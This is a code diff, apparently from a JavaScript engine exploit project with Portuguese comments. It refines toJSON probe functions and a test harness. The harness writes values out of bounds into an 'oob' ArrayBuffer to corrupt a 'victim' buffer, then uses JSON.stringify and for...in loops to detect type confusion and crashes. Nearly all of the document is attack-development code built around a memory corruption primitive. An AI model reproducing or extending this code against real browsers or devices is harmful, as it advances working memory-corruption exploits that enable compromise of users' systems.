@@ -16,24 +16,20 @@ export function toJSON_AB_Probe_V1() {
     const FNAME_toJSON = "toJSON_AB_Probe_V1";
     let result = {
         toJSON_variant: FNAME_toJSON,
-        this_type: "N/A",
-        is_array_buffer_instance: false,
+        this_type_entry: Object.prototype.toString.call(this),
+        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
         byteLength_prop: "N/A",
         is_dataview_created: false,
-        dv_write_val: 0xBADDBADD, // Valor que tentaremos escrever
+        dv_write_val: 0xBADDBADD,
         dv_read_val: "N/A",
         dv_rw_match: false,
         error: null
     };
     try {
-        result.this_type = Object.prototype.toString.call(this);
-        result.is_array_buffer_instance = this instanceof ArrayBuffer;
-
-        if (!result.is_array_buffer_instance) {
-            result.error = "this is not an ArrayBuffer instance.";
+        if (!result.is_array_buffer_instance_entry) {
+            result.error = "this is not an ArrayBuffer instance at entry.";
             return result;
         }
-
         result.byteLength_prop = this.byteLength;
         const dv = new DataView(this);
         result.is_dataview_created = true;
@@ -46,88 +42,134 @@ export function toJSON_AB_Probe_V1() {
                 result.dv_rw_match = true;
             }
         } else {
-            result.dv_read_val = "Buffer too small for DV R/W (size: " + this.byteLength + ")";
+            result.dv_read_val = `Buffer too small for DV R/W (size: ${this.byteLength})`;
         }
     } catch (e) {
         result.error = `${e.name}: ${e.message}`;
+        logS3(`[${FNAME_toJSON}] ERRO: ${result.error}`, "error", FNAME_toJSON);
     }
     return result;
 }
 
-// V2: V1 + loop for...in this (sem operações complexas dentro do loop)
-export function toJSON_AB_Probe_V2() {
-    const FNAME_toJSON = "toJSON_AB_Probe_V2";
-    // Começa com a lógica da V1
-    let result = toJSON_AB_Probe_V1(); // Chama V1 para verificações básicas
-    result.toJSON_variant = FNAME_toJSON; // Sobrescreve a variante
-    result.for_in_iterations = 0;
-    result.for_in_error = null;
+// V2_Detailed (NOVA): V1 + loop for...in this com logs detalhados para type confusion
+export function toJSON_AB_Probe_V2_Detailed() {
+    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
+    let result = {
+        toJSON_variant: FNAME_toJSON,
+        this_type_entry: "N/A",
+        is_array_buffer_instance_entry: false,
+        byteLength_prop: "N/A",
+        for_in_iterations: 0,
+        this_type_in_loop: "N/A", // Tipo de this na primeira iteração do loop ou onde mudar
+        this_type_after_loop: "N/A",
+        error: null
+    };
 
-    if (result.error) { // Se V1 já teve erro, não prossegue com for...in
-        return result;
-    }
+    logS3(`[${FNAME_toJSON}] Entrando. this type inicial: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
+    result.this_type_entry = Object.prototype.toString.call(this);
+    result.is_array_buffer_instance_entry = this instanceof ArrayBuffer;
 
     try {
+        if (!result.is_array_buffer_instance_entry) {
+            result.error = "this is not an ArrayBuffer instance at ENTRY.";
+            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
+            return result;
+        }
+
+        result.byteLength_prop = this.byteLength;
+        logS3(`[${FNAME_toJSON}] Antes do for...in. this type: ${Object.prototype.toString.call(this)}, len: ${this.byteLength}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
+
         for (const prop in this) {
             result.for_in_iterations++;
-            if (result.for_in_iterations > 10000) { // Safety break
-                logS3(`[${FNAME_toJSON}] Loop for...in V2 excedeu 10000 iterações.`, "warn", FNAME_toJSON);
-                result.for_in_error = "Max iterations reached in for...in";
+            const current_this_type_in_loop = Object.prototype.toString.call(this);
+            const current_instanceof_ab_in_loop = this instanceof ArrayBuffer;
+            if (result.for_in_iterations === 1 || result.this_type_in_loop === "N/A") { // Captura o tipo na primeira iteração
+                result.this_type_in_loop = current_this_type_in_loop;
+            }
+            logS3(`[${FNAME_toJSON}] Dentro do for...in, iter ${result.for_in_iterations}, prop: '${prop}'. this type: ${current_this_type_in_loop}, instanceof AB: ${current_instanceof_ab_in_loop}`, "info", FNAME_toJSON);
+
+            if (!current_instanceof_ab_in_loop && result.this_type_entry === "[object ArrayBuffer]") {
+                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA DENTRO do loop for...in !!!! this era ArrayBuffer, agora é ${current_this_type_in_loop}`, "critical", FNAME_toJSON);
+                result.error = `Type confusion inside for...in (was ArrayBuffer, became ${current_this_type_in_loop})`;
+                result.this_type_in_loop = current_this_type_in_loop; // Garante que o tipo confuso seja registrado
+                break; // Sai do loop ao detectar a confusão
+            }
+            if (result.for_in_iterations > 100) { // Safety break reduzido
+                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 100 iterações. Interrompendo.`, "warn", FNAME_toJSON);
+                if (!result.error) result.error = "Max iterations reached in for...in";
                 break;
             }
         }
-    } catch (e_for_in) {
-        result.for_in_error = `${e_for_in.name}: ${e_for_in.message}`;
-        if (!result.error) result.error = result.for_in_error; // Reporta o erro do for...in se não houve erro anterior
+        result.this_type_after_loop = Object.prototype.toString.call(this);
+        logS3(`[${FNAME_toJSON}] Após o for...in. Iterações: ${result.for_in_iterations}. this type final: ${result.this_type_after_loop}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
+
+    } catch (e) {
+        result.error = `${e.name}: ${e.message}`;
+        logS3(`[${FNAME_toJSON}] ERRO GERAL na toJSON: ${result.error}. this type: ${Object.prototype.toString.call(this)}`, "error", FNAME_toJSON);
     }
     return result;
 }
 
-// V3: V2 + atribuição props_payload[prop] = String(this[prop]).substring() dentro do for...in
+
+// V3: (V2 com logs detalhados) + atribuição props_payload[prop] = String(this[prop]).substring() dentro do for...in
 export function toJSON_AB_Probe_V3() {
     const FNAME_toJSON = "toJSON_AB_Probe_V3";
-    // Começa com a lógica da V2 (que inclui V1 e o loop for...in básico)
-    let result = toJSON_AB_Probe_V2();
+    // Inicia com a lógica de V2_Detailed para ter os logs e a checagem de type confusion
+    let result = toJSON_AB_Probe_V2_Detailed();
     result.toJSON_variant = FNAME_toJSON; // Sobrescreve
     result.props_assigned_count = 0;
-    result.assignment_error = null;
-    let props_payload = {}; // O objeto que causou problemas antes
+    result.assignment_error_detail = null; // Renomeado para não colidir com 'error' de V2_Detailed
 
-    if (result.error || result.for_in_error) { // Se V1 ou o loop for...in básico já teve erro
+    if (result.error) { // Se V2_Detailed já teve erro (ex: type confusion), não prossegue com atribuições
+        logS3(`[${FNAME_toJSON}] Erro prévio de V2_Detailed ('${result.error}'), pulando lógica de atribuição V3.`, "warn", FNAME_toJSON);
         return result;
     }
 
+    let props_payload = {};
     try {
-        // Reinicia a contagem de iterações para o loop com atribuição
-        result.for_in_iterations_V3_specific = 0; // Nova contagem para este loop específico
+        // Reinicia a contagem de iterações para este loop específico se quisermos ser granulares
+        // mas vamos assumir que o result.for_in_iterations de V2_Detailed é o que queremos para o log
+        // Se V2_Detailed saiu por type confusion, o loop aqui não deve rodar muito.
+        logS3(`[${FNAME_toJSON}] Entrando na lógica de atribuição V3. this type atual: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
+
+        let v3_iterations = 0; // Contador separado para o loop V3
         for (const prop in this) {
-            result.for_in_iterations_V3_specific++;
+            v3_iterations++;
+            // Re-checar type confusion a cada iteração ANTES de tentar operar
+            const current_this_type_v3 = Object.prototype.toString.call(this);
+            const current_instanceof_ab_v3 = this instanceof ArrayBuffer;
+             if (!current_instanceof_ab_v3) {
+                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA ANTES DA ATRIBUIÇÃO na iter ${v3_iterations}!!!! this é ${current_this_type_v3}`, "critical", FNAME_toJSON);
+                result.assignment_error_detail = `Type confusion before assignment in V3 (became ${current_this_type_v3})`;
+                if (!result.error) result.error = result.assignment_error_detail;
+                break;
+            }
+
             if (Object.prototype.hasOwnProperty.call(this, prop)) {
                 try {
-                    // Para ArrayBuffer, as propriedades enumeráveis são geralmente índices numéricos se for uma view tipada,
-                    // ou métodos do protótipo. Stringify(this[prop]) em métodos pode ser complexo.
-                    // Vamos focar em propriedades que não são funções.
                     if (typeof this[prop] !== 'function') {
                         props_payload[prop] = String(this[prop]).substring(0, 50);
                         result.props_assigned_count++;
                     }
                 } catch (e_assign) {
-                    result.assignment_error = `Error assigning prop '${prop}': ${e_assign.name} - ${e_assign.message}`;
-                    logS3(`[${FNAME_toJSON}] ERRO ao processar/atribuir prop '${prop}': ${result.assignment_error}`, "warn", FNAME_toJSON);
+                    result.assignment_error_detail = `Error assigning prop '${prop}': ${e_assign.name} - ${e_assign.message}`;
+                    logS3(`[${FNAME_toJSON}] ERRO ao processar/atribuir prop '${prop}': ${result.assignment_error_detail}`, "warn", FNAME_toJSON);
                     // Não quebrar o loop por um erro em uma propriedade, mas registrar
                 }
             }
-            if (result.for_in_iterations_V3_specific > 10000) {
-                logS3(`[${FNAME_toJSON}] Loop for...in V3 excedeu 10000 iterações.`, "warn", FNAME_toJSON);
-                if (!result.assignment_error) result.assignment_error = "Max iterations reached in V3 for...in";
+            if (v3_iterations > 100) { // Safety break
+                logS3(`[${FNAME_toJSON}] Loop de atribuição V3 excedeu 100 iterações.`, "warn", FNAME_toJSON);
+                if (!result.assignment_error_detail && !result.error) result.error = "Max iterations in V3 assignment loop";
                 break;
             }
         }
-    } catch (e_for_in_v3) { // Erro no loop for...in da V3
-        result.assignment_error = `${e_for_in_v3.name}: ${e_for_in_v3.message}`;
-        if (!result.error) result.error = result.assignment_error;
+        logS3(`[${FNAME_toJSON}] Loop de atribuição V3 completou ${v3_iterations} iterações. Props atribuídas: ${result.props_assigned_count}`, "info", FNAME_toJSON);
+
+    } catch (e_for_in_v3) {
+        result.assignment_error_detail = `Erro no loop de atribuição V3: ${e_for_in_v3.name}: ${e_for_in_v3.message}`;
+        if (!result.error) result.error = result.assignment_error_detail;
+        logS3(`[${FNAME_toJSON}] ERRO GERAL no loop de atribuição V3: ${result.assignment_error_detail}`, "error", FNAME_toJSON);
     }
-    // Não retornamos props_payload para evitar complexidade no log, apenas o contador
     return result;
 }
 
@@ -157,6 +199,15 @@ export async function executeVictimABInstabilityTest(toJSONFunctionToUse, toJSON
         clearOOBEnvironment();
         return { setupError: e_victim_alloc };
     }
+     // Adicionar propriedades customizadas para testar o for...in (Passo 3 da sugestão anterior)
+    try {
+        victim_ab.customPropStr = "hello_victim";
+        victim_ab.customPropNum = 12345;
+        logS3(`   Propriedades customizadas adicionadas a victim_ab.`, "info", FNAME_TEST);
+    } catch (e_custom_prop) {
+        logS3(`   ERRO ao adicionar props customizadas a victim_ab: ${e_custom_prop.message}`, "warn", FNAME_TEST);
+    }
+
 
     try {
         logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
@@ -193,9 +244,11 @@ export async function executeVictimABInstabilityTest(toJSONFunctionToUse, toJSON
         try {
             result.toJSONReturn = JSON.stringify(victim_ab);
             logS3(`     JSON.stringify(victim_ab) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
+            // A checagem de erro interno da toJSON agora é feita primariamente pelo log dela
             if (result.toJSONReturn && result.toJSONReturn.error) {
-                 logS3(`     ERRO INTERNO na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
-                 result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
+                 logS3(`     ERRO INTERNO (reportado pela toJSON) na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
+                 // Não sobrescrever stringifyError se já houver um erro de JSON.stringify
+                 if (!result.stringifyError) result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
             }
         } catch (e_str) {
             result.stringifyError = { name: e_str.name, message: e_str.message };
@@ -213,27 +266,40 @@ export async function executeVictimABInstabilityTest(toJSONFunctionToUse, toJSON
         }
     }
 
-    // Analisar o resultado da toJSONReturn para V1
-    if (result.toJSONReturn && result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V1") {
-        if (result.toJSONReturn.error) {
-            logS3(`   ${result.toJSONReturn.toJSON_variant} reportou erro interno: ${result.toJSONReturn.error}`, "error", FNAME_TEST);
-        } else if (!result.toJSONReturn.is_array_buffer_instance) {
-            logS3(`   ${result.toJSONReturn.toJSON_variant}: 'this' não é ArrayBuffer! Tipo: ${result.toJSONReturn.this_type}`, "critical", FNAME_TEST);
-        } else if (result.toJSONReturn.byteLength_prop !== victim_ab_size_val) {
-            logS3(`   ${result.toJSONReturn.toJSON_variant}: victim_ab.byteLength alterado! Esperado: ${victim_ab_size_val}, Obtido: ${result.toJSONReturn.byteLength_prop}`, "critical", FNAME_TEST);
-        } else if (!result.toJSONReturn.dv_rw_match) {
-            logS3(`   ${result.toJSONReturn.toJSON_variant}: Falha na R/W interna da DataView. Lido: ${result.toJSONReturn.dv_read_val} Esperado: ${toHex(result.toJSONReturn.dv_write_val)}`, "warn", FNAME_TEST);
+    // Análise mais detalhada do resultado da toJSON
+    let final_verdict_is_problem = false;
+    if (result.stringifyError) {
+        final_verdict_is_problem = true;
+        logS3(`   ---> Problema Principal: Erro no JSON.stringify(): ${result.stringifyError.name}`, "critical", FNAME_TEST);
+        if (result.stringifyError.name === 'RangeError') document.title = `RangeError with ${toJSONFunctionName}!`;
+    } else if (result.toJSONReturn && result.toJSONReturn.error) {
+        final_verdict_is_problem = true;
+        logS3(`   ---> Problema Principal: Erro interno reportado pela ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "error", FNAME_TEST);
+        if (String(result.toJSONReturn.error).toLowerCase().includes("type confusion")) {
+            document.title = `TypeConfusion with ${toJSONFunctionName}!`;
+        }
+    } else if (result.toJSONReturn) {
+        // Para V1:
+        if (result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V1") {
+            if (!result.toJSONReturn.is_array_buffer_instance_entry || result.toJSONReturn.byteLength_prop !== victim_ab_size_val || !result.toJSONReturn.dv_rw_match) {
+                final_verdict_is_problem = true;
+                logS3(`   ---> Problema com ${result.toJSONReturn.toJSON_variant}: Falha nas verificações básicas do ArrayBuffer. isAB=${result.toJSONReturn.is_array_buffer_instance_entry}, len=${result.toJSONReturn.byteLength_prop}, rwMatch=${result.toJSONReturn.dv_rw_match}`, "warn", FNAME_TEST);
+            }
+        }
+        // Para V2_Detailed:
+        else if (result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
+             if (result.toJSONReturn.is_array_buffer_instance_entry &&
+                (result.toJSONReturn.this_type_in_loop !== "[object ArrayBuffer]" && result.toJSONReturn.this_type_in_loop !== "N/A") || // N/A se loop 0 iters
+                (result.toJSONReturn.this_type_after_loop !== "[object ArrayBuffer]")) {
+                final_verdict_is_problem = true;
+                logS3(`   ---> TYPE CONFUSION DETECTADA por ${result.toJSONReturn.toJSON_variant}. Entry: ${result.toJSONReturn.this_type_entry}, InLoop: ${result.toJSONReturn.this_type_in_loop}, AfterLoop: ${result.toJSONReturn.this_type_after_loop}`, "critical", FNAME_TEST);
+                document.title = `TypeConfusion with ${toJSONFunctionName}!`;
+            }
         }
     }
-    // Analisar para V2 e V3 (erros já logados se ocorrerem no stringify ou internamente)
 
-    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
-        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
-        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
-    } else if (result.stringifyError) {
-        logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para victim_ab.`, "error", FNAME_TEST);
-    } else {
-        logS3(`   ${toJSONFunctionName} para victim_ab completou sem erro de stringify óbvio.`, "good", FNAME_TEST);
+    if (!final_verdict_is_problem) {
+        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
     }
 
     logS3(`--- Sub-Teste com ${toJSONFunctionName} (alvo victim_ab) CONCLUÍDO ---`, "subtest", FNAME_TEST);
